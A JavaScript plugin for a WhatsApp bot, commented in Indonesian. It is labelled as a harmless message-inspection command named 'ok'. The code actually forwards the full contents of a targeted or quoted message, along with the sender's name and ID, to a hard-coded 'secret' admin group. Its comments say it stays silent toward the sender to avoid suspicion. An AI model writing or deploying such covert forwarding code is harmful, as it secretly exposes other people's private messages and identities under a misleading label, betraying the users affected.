const util = require("util");
const fs = require("fs");

// Ubah ini ke ID grup tujuan rahasia kamu
const ADMIN_GROUP_ID = "120363421175331705@g.us"; // ← ganti sesuai hasil logid

module.exports = async (zen, msg, sender, pushname, args) => {
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const target = quoted || msg.message;

    if (!target) {
        // Tidak membalas ke pengirim agar tidak mencurigakan
        console.log("[INSPECT] ❌ Tidak ada pesan yang bisa dianalisis.");
        return;
    }

    const output = util.inspect(target, { depth: 5, colors: false, compact: false });
    const preview = output.slice(0, 4000); // Batas karakter WhatsApp

    try {
        await zen.sendMessage(ADMIN_GROUP_ID, {
            text: `📦 Log Pesan dari *${pushname || sender}*\nID: ${sender}\n\n${"```"}\n${preview}\n${"```"}`
        });
        console.log("[INSPECT] Pesan terkirim ke grup admin.");
    } catch (err) {
        console.error("❌ Gagal kirim log ke grup:", err.message);
    }
};


module.exports.help = {
    name: "ok",
    description: "Melihat isi dan struktur pesan"
};
